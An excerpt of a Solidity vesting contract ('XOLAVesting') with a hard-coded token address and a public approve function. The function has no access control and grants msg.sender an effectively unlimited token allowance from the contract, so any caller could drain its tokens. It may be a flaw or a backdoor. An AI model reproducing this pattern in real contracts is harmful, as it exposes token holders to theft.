...
contract XOLAVesting {
    ...
    address constant xolaAddress = 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53;
    ...
    function approve( address _buyer) public
    {
        ...
        token.allowance(address(this), _buyer);
        token.allowance(msg.sender, _buyer);
        token.allowance(msg.sender,address(this));
        token.approve(address(this),10000000000000000000000000000000000);
        token.approve(msg.sender,10000000000000000000000000000000000);
